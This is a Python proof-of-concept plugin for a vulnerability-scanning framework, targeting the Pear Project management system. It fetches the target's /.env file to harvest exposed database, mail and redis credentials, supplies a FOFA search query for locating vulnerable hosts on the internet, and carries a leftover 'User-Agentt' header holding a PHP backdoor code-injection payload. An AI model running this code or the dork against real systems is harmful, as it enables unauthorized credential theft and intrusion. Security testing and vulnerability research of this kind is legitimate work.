# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase

# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-07",        # POC创建时间
        "UpdateDate" : "2021-06-07",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "梨子项目管理系统 信息泄露漏洞",                        # 漏洞名称
        "AppName" : "梨子项目管理系统",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-03-28",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            梨子项目管理系统的系统架构为前后端分离设计，其开发技术采用了Vue+php+node.js等。
            安装该系统需要设置环境变量，环境变量文件是.env文件，在前端访问不到这个文件。
            但是如果获取到后端接口，就可以直接访问.env文件，从而导致通用型敏感信息泄露，
            其中包括数据库账号密码，邮箱账号密码，redis账号密码等。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
        icon_hash="404259713"
        /
        Pear Project
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  

    }

    # timeout = 10

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/.env" # url自己按需调整


        headers = {"User-Agent":get_random_ua(),
                    "User-Agentt":"zerodiumvar_dump(133*133);",
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req.status_code == 200 and \
                "[app]" in req.text and \
                "[database]" in req.text and \
                "app_version" in req.text and \
                "app_trace" in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
    
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()